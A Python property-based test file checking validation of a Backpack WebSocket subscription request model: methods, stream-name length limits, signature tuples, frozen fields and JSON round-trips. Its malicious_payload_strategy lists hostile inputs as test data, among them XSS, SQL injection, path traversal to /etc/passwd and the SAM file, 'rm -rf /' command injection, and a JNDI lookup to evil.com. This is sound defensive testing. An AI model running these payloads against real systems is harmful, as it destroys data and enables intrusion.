"""Property-based tests for Backpack WebSocket subscription payload models.

This module provides comprehensive property-based testing of Backpack WebSocket payload models,
which are critical for secure real-time trading communication and subscription management.

SECURITY CRITICAL: WebSocket payload validation must prevent:
- Injection attacks through malformed subscription parameters
- Authentication bypass through signature manipulation
- DoS attacks through oversized payload construction
- Stream enumeration attacks through parameter fuzzing
- Protocol confusion attacks through unexpected field combinations

Key Testing Areas:
- Method validation with case sensitivity and enum compliance
- Stream parameter validation with length and format constraints
- Signature tuple validation for authenticated subscriptions
- JSON serialization consistency and security
- Field immutability and frozen model enforcement
- Extra field rejection for protocol compliance

Following TESTING_SECURITY_RULES.md:
- NO hardcoded payload values (Hypothesis generates them)
- NO fallback mechanisms that could hide validation errors
- Comprehensive testing of WebSocket security boundaries
- Validation of authentication-critical signature handling

Architecture Compliance:
- Follows RULE-ARCH-MODEL-DESIGN-V2 for WebSocket model design
- Implements RULE-RUNTIME-SAFETY-V4 for safe payload processing
- Adheres to RULE-NO-SILENCING-V4 for proper validation error propagation
"""

from __future__ import annotations

import json
from datetime import timedelta
from typing import Any, Literal, cast

import pytest
from hypothesis import given, settings, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.backpack.models.bp_ws_payloads import BackpackRawWsSubscriptionRequest
from cyberdelta.exceptions.field_validation import TypeFieldError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR WEBSOCKET PAYLOAD TESTING
# =============================================================================


def _filter_non_subscribe_methods(x: str) -> bool:
    """Filter function to exclude SUBSCRIBE and UNSUBSCRIBE methods.

    Returns:
        bool: True if the method is not SUBSCRIBE or UNSUBSCRIBE.
    """
    return x not in ["SUBSCRIBE", "UNSUBSCRIBE"]


def _create_stream_name_from_type_symbol(stream_type: str, symbol: str) -> str:
    """Create stream name from stream type and symbol.

    Returns:
        str: Stream name in format "{stream_type}.{symbol}".
    """
    return f"{stream_type}.{symbol}"


def _create_symbol_from_base_quote(base: str, quote: str) -> str:
    """Create symbol from base and quote assets.

    Returns:
        str: Symbol in format "{base}_{quote}".
    """
    return f"{base}_{quote}"


def _create_account_stream_name(account_type: str) -> str:
    """Create account stream name from account type.

    Returns:
        str: Account stream name in format "account.{account_type}".
    """
    return f"account.{account_type}"


def _filter_stream_name_by_length(x: str) -> bool:
    """Filter stream names by UTF-8 byte length.

    Returns:
        bool: True if the stream name is within the 128 byte limit.
    """
    return len(x.encode("utf-8")) <= 128


def _filter_stream_name_too_long(x: str) -> bool:
    """Filter stream names that are too long in UTF-8 bytes.

    Returns:
        bool: True if the stream name exceeds the 128 byte limit.
    """
    return len(x.encode("utf-8")) > 128


def _create_signature_tuple(a: str, b: str, c: str, d: str) -> tuple[str, str, str, str]:
    """Create signature tuple from four string components.

    Returns:
        tuple[str, str, str, str]: Signature tuple containing four string components.
    """
    return (a, b, c, d)


def _create_recursive_structure(children: SearchStrategy[Any]) -> SearchStrategy[Any]:
    """Create recursive structure from children strategy.

    Returns:
        SearchStrategy[Any]: Strategy for generating recursive data structures.
    """
    return st.lists(children, max_size=3) | st.dictionaries(
        st.text(max_size=5), children, max_size=3
    )


def _filter_non_payload_fields(x: str) -> bool:
    """Filter function to exclude core payload fields.

    Returns:
        bool: True if the field name is not a core payload field.
    """
    return x not in {"method", "params", "signature"}


def ws_method_strategy() -> SearchStrategy[Literal["SUBSCRIBE", "UNSUBSCRIBE"]]:
    """Generate valid WebSocket method strings.

    Returns:
        A Hypothesis strategy for valid WS methods.
    """
    return cast(
        SearchStrategy[Literal["SUBSCRIBE", "UNSUBSCRIBE"]],
        st.sampled_from(["SUBSCRIBE", "UNSUBSCRIBE"]),
    )


def invalid_ws_method_strategy() -> SearchStrategy[str]:
    """Generate invalid WebSocket method strings.

    Returns:
        A Hypothesis strategy for invalid WS methods.
    """
    return st.one_of([
        # Case variations (should be rejected)
        st.just("subscribe"),
        st.just("Subscribe"),
        st.just("UNSUBSCRIBE".lower()),
        st.just("Unsubscribe"),
        # Invalid methods
        st.just("CONNECT"),
        st.just("DISCONNECT"),
        st.just("PING"),
        st.just("PONG"),
        st.just("INVALID_METHOD"),
        st.text(min_size=1, max_size=50).filter(_filter_non_subscribe_methods),
    ])


def stream_name_strategy() -> SearchStrategy[str]:
    """Generate valid stream name strings.

    Returns:
        A Hypothesis strategy for valid stream names.
    """
    return st.one_of([
        # Common public streams
        st.sampled_from([
            "ticker.BTC_USDC",
            "ticker.ETH_USDC",
            "ticker.SOL_USDC",
            "trades.BTC_USDC",
            "trades.ETH_USDC",
            "depth.BTC_USDC",
            "depth.ETH_USDC",
            "klines.BTC_USDC.1m",
            "klines.ETH_USDC.1h",
        ]),
        # Common private streams
        st.sampled_from([
            "account.orderUpdate",
            "account.fillUpdate",
            "account.balanceUpdate",
            "fills",
            "orders",
        ]),
        # Generated stream names
        st.builds(
            _create_stream_name_from_type_symbol,
            st.sampled_from(["ticker", "trades", "depth", "klines"]),
            st.builds(
                _create_symbol_from_base_quote,
                st.text(
                    min_size=2, max_size=10, alphabet=st.characters(whitelist_categories=["Lu"])
                ),
                st.sampled_from(["USDC", "USDT", "BTC", "ETH"]),
            ),
        ),
        st.builds(
            _create_account_stream_name,
            st.sampled_from(["orderUpdate", "fillUpdate", "balanceUpdate", "positionUpdate"]),
        ),
        # Valid format within length limits
        st.text(
            min_size=1,
            max_size=128,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="._-"
            ),
        ).filter(_filter_stream_name_by_length),
    ])


def invalid_stream_name_strategy() -> SearchStrategy[str]:
    """Generate invalid stream name strings.

    Returns:
        A Hypothesis strategy for invalid stream names.
    """
    return st.one_of([
        # Too long
        st.text(min_size=129, max_size=500),
        st.just("a" * 129),
        # Unicode that might cause issues
        st.text(min_size=1, max_size=200).filter(_filter_stream_name_too_long),
    ])


def signature_component_strategy() -> SearchStrategy[str]:
    """Generate valid signature component strings.

    Returns:
        A Hypothesis strategy for signature components.
    """
    return st.one_of([
        # Base64-like strings
        st.text(
            min_size=1,
            max_size=256,
            alphabet="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
        ),
        # Timestamp strings
        st.builds(str, st.integers(min_value=1000000000, max_value=9999999999)),
        # Window strings
        st.builds(str, st.integers(min_value=1000, max_value=30000)),
        # Common signature formats
        st.sampled_from([
            "base64encodedverifyingkey==",
            "base64encodedsignature==",
            "1234567890",
            "5000",
        ]),
    ])


def valid_signature_strategy() -> SearchStrategy[tuple[str, str, str, str]]:
    """Generate valid signature tuples.

    Returns:
        A Hypothesis strategy for valid 4-element signature tuples.
    """
    return st.builds(
        _create_signature_tuple,
        signature_component_strategy(),
        signature_component_strategy(),
        signature_component_strategy(),
        signature_component_strategy(),
    )


def invalid_signature_strategy() -> SearchStrategy[Any]:
    """Generate invalid signature structures.

    Returns:
        A Hypothesis strategy for invalid signatures.
    """
    return st.one_of([
        # Wrong length tuples
        st.tuples(signature_component_strategy()),
        st.tuples(signature_component_strategy(), signature_component_strategy()),
        st.tuples(
            signature_component_strategy(),
            signature_component_strategy(),
            signature_component_strategy(),
        ),
        st.tuples(
            signature_component_strategy(),
            signature_component_strategy(),
            signature_component_strategy(),
            signature_component_strategy(),
            signature_component_strategy(),
        ),
        # Wrong types
        st.lists(signature_component_strategy(), min_size=3, max_size=5),
        st.text(),
        st.integers(),
        st.dictionaries(st.text(), st.text()),
    ])


def params_list_strategy() -> SearchStrategy[list[str]]:
    """Generate valid params lists.

    Returns:
        A Hypothesis strategy for params lists.
    """
    return st.one_of([
        # Empty list
        st.just([]),
        # Single stream
        st.lists(stream_name_strategy(), min_size=1, max_size=1),
        # Multiple streams
        st.lists(stream_name_strategy(), min_size=2, max_size=10, unique=True),
    ])


def malicious_payload_strategy() -> SearchStrategy[Any]:
    """Generate malicious payload inputs for security testing.

    Returns:
        A Hypothesis strategy for malicious payload inputs.
    """
    return st.one_of([
        # XSS attempts in stream names
        st.just(["<script>alert('xss')</script>"]),
        st.just(["<img src=x onerror=alert(1)>"]),
        # SQL injection attempts
        st.just(["'; DROP TABLE subscriptions;--"]),
        st.just(["1' OR '1'='1"]),
        # Path traversal
        st.just(["../../../etc/passwd"]),
        st.just(["..\\..\\..\\windows\\system32\\config\\sam"]),
        # Command injection
        st.just(["; rm -rf /"]),
        st.just(["$(rm -rf /)"]),
        st.just(["`rm -rf /`"]),
        # Buffer overflow attempts
        st.lists(st.text(min_size=1000, max_size=1500), min_size=1, max_size=3),
        st.just(["A" * 1500]),
        # Unicode attacks
        st.just(["\udce2\udc28\udc00"]),  # Lone surrogates
        st.just(["\x00\x01\x02"]),  # Control characters
        # Format string attacks
        st.just(["%s%s%s%s%s"]),
        st.just(["${jndi:ldap://evil.com/a}"]),
        # JSON injection
        st.just(['{"malicious": "payload"}']),
        st.just(["\\x22malicious\\x22"]),
        # Protocol confusion
        st.just(["SUBSCRIBE"]),  # Method as stream name
        st.just(["method:UNSUBSCRIBE"]),
    ])


# =============================================================================
# PROPERTY TESTS FOR WEBSOCKET SUBSCRIPTION REQUEST
# =============================================================================


class TestBackpackRawWsSubscriptionRequestProperties:
    """Property-based tests for BackpackRawWsSubscriptionRequest."""

    @given(
        method=ws_method_strategy(),
        params=params_list_strategy(),
    )
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_valid_public_subscription_properties(
        self, method: Literal["SUBSCRIBE", "UNSUBSCRIBE"], params: list[str]
    ) -> None:
        """Property: Valid public subscriptions should always be accepted."""
        request = BackpackRawWsSubscriptionRequest(method=method, params=params)

        # Property: Values should be preserved exactly
        assert request.method == method
        assert request.params == params
        assert request.signature is None

        # Property: Should be serializable
        data = request.model_dump(by_alias=True, exclude_none=True)
        assert data["method"] == method
        assert data["params"] == params
        assert "signature" not in data

    @given(
        method=ws_method_strategy(),
        params=params_list_strategy(),
        signature=valid_signature_strategy(),
    )
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_valid_private_subscription_properties(
        self,
        method: Literal["SUBSCRIBE", "UNSUBSCRIBE"],
        params: list[str],
        signature: tuple[str, str, str, str],
    ) -> None:
        """Property: Valid private subscriptions with signatures should be accepted."""
        request = BackpackRawWsSubscriptionRequest(
            method=method, params=params, signature=signature
        )

        # Property: Values should be preserved exactly
        assert request.method == method
        assert request.params == params
        assert request.signature == signature
        assert request.signature is not None  # Type narrowing for length check
        assert len(request.signature) == 4

        # Property: Should be serializable with signature
        data = request.model_dump(by_alias=True, exclude_none=True)
        assert data["method"] == method
        assert data["params"] == params
        assert data["signature"] == signature

    @given(invalid_method=invalid_ws_method_strategy())
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_invalid_method_rejection(self, invalid_method: str) -> None:
        """Property: Invalid methods should always be rejected."""
        with pytest.raises(ValidationError) as exc_info:
            BackpackRawWsSubscriptionRequest(method=invalid_method, params=[])  # type: ignore[arg-type]

        # Property: Error should mention method validation
        error_msg = str(exc_info.value)
        assert "method" in error_msg.lower() or invalid_method in error_msg

    @given(
        method=ws_method_strategy(),
        invalid_signature=invalid_signature_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_invalid_signature_rejection(
        self, method: Literal["SUBSCRIBE", "UNSUBSCRIBE"], invalid_signature: object
    ) -> None:
        """Property: Invalid signatures should be rejected."""
        with pytest.raises(ValidationError):
            BackpackRawWsSubscriptionRequest(
                method=method,
                params=["account.orderUpdate"],
                signature=cast("tuple[str, str, str, str] | None", invalid_signature),
            )

    @given(
        method=ws_method_strategy(),
        invalid_stream=invalid_stream_name_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_invalid_stream_name_rejection(
        self, method: Literal["SUBSCRIBE", "UNSUBSCRIBE"], invalid_stream: str
    ) -> None:
        """Property: Invalid stream names should be rejected."""
        # Oversized streams should raise TypeFieldError
        with pytest.raises(TypeFieldError):
            BackpackRawWsSubscriptionRequest(method=method, params=[invalid_stream])

    @given(
        method=ws_method_strategy(),
        params=params_list_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_immutability_enforcement(
        self, method: Literal["SUBSCRIBE", "UNSUBSCRIBE"], params: list[str]
    ) -> None:
        """Property: WebSocket requests should be immutable after creation."""
        request = BackpackRawWsSubscriptionRequest(method=method, params=params)

        # Property: Should not be able to modify method
        with pytest.raises(ValidationError, match="Instance is frozen"):
            request.method = "UNSUBSCRIBE" if method == "SUBSCRIBE" else "SUBSCRIBE"

        # Property: Should not be able to modify params
        with pytest.raises(ValidationError, match="Instance is frozen"):
            request.params = ["new_stream"]

    @given(
        method=ws_method_strategy(),
        params=params_list_strategy(),
        signature=st.one_of([st.none(), valid_signature_strategy()]),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_json_serialization_consistency(
        self,
        method: Literal["SUBSCRIBE", "UNSUBSCRIBE"],
        params: list[str],
        signature: tuple[str, str, str, str] | None,
    ) -> None:
        """Property: JSON serialization should be consistent and reversible."""
        request = BackpackRawWsSubscriptionRequest(
            method=method, params=params, signature=signature
        )

        # Property: Should serialize to valid JSON
        json_str = request.model_dump_json(by_alias=True, exclude_none=True)
        parsed = json.loads(json_str)

        # Property: Should contain expected fields
        assert parsed["method"] == method
        assert parsed["params"] == params

        if signature is not None:
            assert "signature" in parsed
            # JSON converts tuple to list
            assert isinstance(parsed["signature"], list)
            assert parsed["signature"] == list(signature)
        else:
            assert "signature" not in parsed

    @given(
        method=ws_method_strategy(),
        stream_count=st.integers(min_value=0, max_value=100),
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_params_list_length_handling(
        self, method: Literal["SUBSCRIBE", "UNSUBSCRIBE"], stream_count: int
    ) -> None:
        """Property: Various params list lengths should be handled correctly."""
        # Generate unique stream names
        streams = [f"stream_{i}" for i in range(stream_count)]

        request = BackpackRawWsSubscriptionRequest(method=method, params=streams)

        # Property: List length should be preserved
        assert len(request.params) == stream_count
        assert request.params == streams


# =============================================================================
# PROPERTY TESTS FOR SECURITY BOUNDARIES
# =============================================================================


class TestBackpackWsPayloadSecurityProperties:
    """Property-based tests for security-critical WebSocket payload behavior."""

    @given(
        method=ws_method_strategy(),
        malicious_params=malicious_payload_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_malicious_params_resistance(
        self, method: Literal["SUBSCRIBE", "UNSUBSCRIBE"], malicious_params: object
    ) -> None:
        """Property: WebSocket payloads should resist malicious parameter inputs."""
        # Convert to list of strings if needed
        if not isinstance(malicious_params, list):
            params_list = [str(malicious_params)]
        else:
            # Type narrowing: malicious_params is now list
            assert isinstance(malicious_params, list)
            # Hypothesis generates list[object] but PyRight can't infer the object type
            # Using cast is safe here as str() accepts any object type
            # #[CAST-REVIEW-REQUIRED] Test-only code for fuzzing - hypothesis provides
            # unknown object types
            malicious_list = cast(list[object], malicious_params)
            assert isinstance(malicious_list, list)  # Runtime verification per RULE-NO-SILENCING-V4
            # Convert items to strings - str() accepts any object
            params_list = [str(item) for item in malicious_list]

        try:
            request = BackpackRawWsSubscriptionRequest(method=method, params=params_list)

            # If accepted, should be preserved as-is (no interpretation/execution)
            assert request.params == params_list

            # Should not leak sensitive information in string representation
            request_str = str(request)
            assert "password" not in request_str.lower()
            assert "secret" not in request_str.lower()
            assert "key" not in request_str.lower()

        except (ValidationError, TypeFieldError):
            # Rejection is acceptable for invalid inputs
            pass

    @given(
        method=ws_method_strategy(),
        large_params=st.lists(st.text(min_size=1000, max_size=10000), min_size=1, max_size=10),
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_large_params_handling(
        self, method: Literal["SUBSCRIBE", "UNSUBSCRIBE"], large_params: list[str]
    ) -> None:
        """Property: Large parameter lists should be handled safely."""
        # Should reject oversized parameters with appropriate error
        with pytest.raises(TypeFieldError):
            BackpackRawWsSubscriptionRequest(method=method, params=large_params)

    @given(
        method=ws_method_strategy(),
        unicode_params=st.lists(st.text(min_size=1, max_size=50), min_size=1, max_size=5),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_unicode_params_handling(
        self, method: Literal["SUBSCRIBE", "UNSUBSCRIBE"], unicode_params: list[str]
    ) -> None:
        """Property: Unicode parameters should be handled appropriately."""
        try:
            # Filter to valid length parameters
            valid_params = [p for p in unicode_params if len(p.encode("utf-8")) <= 128]

            if valid_params:
                request = BackpackRawWsSubscriptionRequest(method=method, params=valid_params)

                # Property: Unicode should be preserved exactly
                assert request.params == valid_params

                # Property: Should be JSON serializable
                json_str = request.model_dump_json()
                assert isinstance(json_str, str)

        except (ValidationError, TypeFieldError):
            # Expected for invalid Unicode or oversized parameters
            pass

    @given(
        deeply_nested_data=st.recursive(
            st.none() | st.booleans() | st.text(max_size=10),
            _create_recursive_structure,
            max_leaves=10,
        ),
    )
    @settings(max_examples=20, deadline=timedelta(seconds=1))
    def test_deeply_nested_data_rejection(self, deeply_nested_data: object) -> None:
        """Property: Deeply nested data should be safely rejected."""
        # Should reject non-primitive types in params
        with pytest.raises(ValidationError):
            BackpackRawWsSubscriptionRequest(
                method="SUBSCRIBE", params=cast("list[str]", deeply_nested_data)
            )

    @given(
        method=ws_method_strategy(),
        control_char_params=st.lists(
            st.text(min_size=1, max_size=20, alphabet="\x00\x01\x02\x03\x1f"),
            min_size=1,
            max_size=3,
        ),
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_control_characters_handling(
        self, method: Literal["SUBSCRIBE", "UNSUBSCRIBE"], control_char_params: list[str]
    ) -> None:
        """Property: Control characters should be handled safely."""
        try:
            # Control characters might be accepted if within length limits
            valid_params = [p for p in control_char_params if len(p.encode("utf-8")) <= 128]

            if valid_params:
                request = BackpackRawWsSubscriptionRequest(method=method, params=valid_params)
                assert request.params == valid_params

        except (ValidationError, TypeFieldError, UnicodeError):
            # Expected for problematic control characters
            pass


# =============================================================================
# PROPERTY TESTS FOR FIELD VALIDATION
# =============================================================================


class TestBackpackWsPayloadFieldValidationProperties:
    """Property-based tests for field-specific validation behavior."""

    @given(
        method=ws_method_strategy(),
        extra_field_name=st.text(min_size=1, max_size=20).filter(_filter_non_payload_fields),
        extra_field_value=st.one_of([st.text(), st.integers(), st.booleans(), st.none()]),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_extra_fields_rejection(
        self,
        method: Literal["SUBSCRIBE", "UNSUBSCRIBE"],
        extra_field_name: str,
        extra_field_value: str | int | bool | None,
    ) -> None:
        """Property: Extra fields should always be rejected."""
        data = {
            "method": method,
            "params": ["ticker.BTC_USDC"],
            extra_field_name: extra_field_value,
        }

        with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
            BackpackRawWsSubscriptionRequest.model_validate(data)

    @given(
        signature=valid_signature_strategy(),
        wrong_type_field=st.sampled_from(["method", "params"]),
        wrong_type_value=st.one_of([
            st.integers(),
            st.booleans(),
            st.dictionaries(st.text(), st.text()),
        ]),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_field_type_validation(
        self, signature: tuple[str, str, str, str], wrong_type_field: str, wrong_type_value: object
    ) -> None:
        """Property: Field types should be strictly validated."""
        data: dict[str, object] = {
            "method": "SUBSCRIBE",
            "params": ["account.orderUpdate"],
            "signature": signature,
        }
        data[wrong_type_field] = wrong_type_value

        with pytest.raises(ValidationError):
            BackpackRawWsSubscriptionRequest.model_validate(data)

    @given(missing_field=st.sampled_from(["method", "params"]))
    @settings(max_examples=20, deadline=timedelta(seconds=1))
    def test_required_fields_validation(self, missing_field: str) -> None:
        """Property: Required fields should always be enforced."""
        data = {"method": "SUBSCRIBE", "params": ["ticker.BTC_USDC"]}
        del data[missing_field]

        with pytest.raises(ValidationError, match="Field required"):
            BackpackRawWsSubscriptionRequest.model_validate(data)

    @given(
        method=ws_method_strategy(),
        boundary_length_stream=st.integers(min_value=120, max_value=135),
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_stream_length_boundary_validation(
        self, method: Literal["SUBSCRIBE", "UNSUBSCRIBE"], boundary_length_stream: int
    ) -> None:
        """Property: Stream length boundaries should be precisely enforced."""
        stream = "a" * boundary_length_stream

        if boundary_length_stream <= 128:
            # Should be accepted
            request = BackpackRawWsSubscriptionRequest(method=method, params=[stream])
            assert request.params[0] == stream
        else:
            # Should be rejected
            with pytest.raises(TypeFieldError):
                BackpackRawWsSubscriptionRequest(method=method, params=[stream])


# =============================================================================
# INTEGRATION PROPERTY TESTS
# =============================================================================


class TestBackpackWsPayloadIntegrationProperties:
    """Integration property tests for WebSocket payload handling."""

    @given(
        subscription_scenarios=st.lists(
            st.tuples(
                ws_method_strategy(),
                params_list_strategy(),
                st.one_of([st.none(), valid_signature_strategy()]),
            ),
            min_size=1,
            max_size=5,
        )
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_batch_subscription_consistency(
        self, subscription_scenarios: list[tuple[str, list[str], tuple[str, str, str, str] | None]]
    ) -> None:
        """Property: Batch subscription processing should be consistent."""
        requests: list[BackpackRawWsSubscriptionRequest] = []

        for method, params, signature in subscription_scenarios:
            assert method in ("SUBSCRIBE", "UNSUBSCRIBE")
            # Type-safe handling for each method type
            if method == "SUBSCRIBE":
                request = BackpackRawWsSubscriptionRequest(
                    method="SUBSCRIBE",
                    params=params,
                    signature=signature,
                )
            else:  # method == "UNSUBSCRIBE"
                request = BackpackRawWsSubscriptionRequest(
                    method="UNSUBSCRIBE",
                    params=params,
                    signature=signature,
                )
            requests.append(request)

        # Property: All requests should be valid
        for request in requests:
            assert request.method in ["SUBSCRIBE", "UNSUBSCRIBE"]
            assert isinstance(request.params, list)
            assert request.signature is None or len(request.signature) == 4

        # Property: Serialization should be consistent
        for request in requests:
            json_str = request.model_dump_json()
            parsed = json.loads(json_str)
            assert "method" in parsed
            assert "params" in parsed

    @given(
        method=ws_method_strategy(),
        params=params_list_strategy(),
        signature=st.one_of([st.none(), valid_signature_strategy()]),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_serialization_round_trip_consistency(
        self,
        method: Literal["SUBSCRIBE", "UNSUBSCRIBE"],
        params: list[str],
        signature: tuple[str, str, str, str] | None,
    ) -> None:
        """Property: Serialization round-trip should preserve data integrity."""
        original_request = BackpackRawWsSubscriptionRequest(
            method=method,
            params=params,
            signature=signature,
        )

        # Serialize to JSON
        json_str = original_request.model_dump_json(by_alias=True, exclude_none=True)

        # Parse back from JSON
        parsed_data = json.loads(json_str)

        # Property: Essential data should be preserved
        assert parsed_data["method"] == method
        assert parsed_data["params"] == params

        if signature is not None:
            assert "signature" in parsed_data
            assert parsed_data["signature"] == list(signature)
        else:
            assert "signature" not in parsed_data


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_public_stream_subscription_basic() -> None:
    """Test basic public stream subscription for regression."""
    request = BackpackRawWsSubscriptionRequest(method="SUBSCRIBE", params=["depth.ETH_USDC"])

    assert request.method == "SUBSCRIBE"
    assert request.params == ["depth.ETH_USDC"]
    assert request.signature is None


def test_private_stream_subscription_with_signature() -> None:
    """Test private stream subscription with signature for regression."""
    request = BackpackRawWsSubscriptionRequest(
        method="SUBSCRIBE",
        params=["account.orderUpdate"],
        signature=("verifying_key", "signature", "1234567890", "5000"),
    )

    assert request.method == "SUBSCRIBE"
    assert request.params == ["account.orderUpdate"]
    assert request.signature is not None
    assert len(request.signature) == 4


def test_multiple_stream_subscription() -> None:
    """Test multiple stream subscription for regression."""
    request = BackpackRawWsSubscriptionRequest(
        method="SUBSCRIBE",
        params=["ticker.BTC_USDC", "trades.ETH_USDC", "depth.SOL_USDC"],
    )

    assert len(request.params) == 3
    assert "ticker.BTC_USDC" in request.params
    assert "trades.ETH_USDC" in request.params
    assert "depth.SOL_USDC" in request.params


def test_empty_params_valid() -> None:
    """Test empty params validity for regression."""
    request = BackpackRawWsSubscriptionRequest(method="SUBSCRIBE", params=[])
    assert request.params == []


def test_model_immutability() -> None:
    """Test model immutability for regression."""
    request = BackpackRawWsSubscriptionRequest(method="SUBSCRIBE", params=["ticker.BTC_USDC"])

    with pytest.raises(ValidationError, match="Instance is frozen"):
        request.method = "UNSUBSCRIBE"


def test_signature_serialization_consistency() -> None:
    """Test signature serialization consistency for regression."""
    request = BackpackRawWsSubscriptionRequest(
        method="SUBSCRIBE",
        params=["fills"],
        signature=("verifying_key", "signature", "1234567890", "5000"),
    )

    # model_dump preserves tuple
    data = request.model_dump(by_alias=True)
    assert isinstance(data["signature"], tuple)

    # JSON converts to list
    json_str = request.model_dump_json(by_alias=True)
    parsed = json.loads(json_str)
    assert isinstance(parsed["signature"], list)
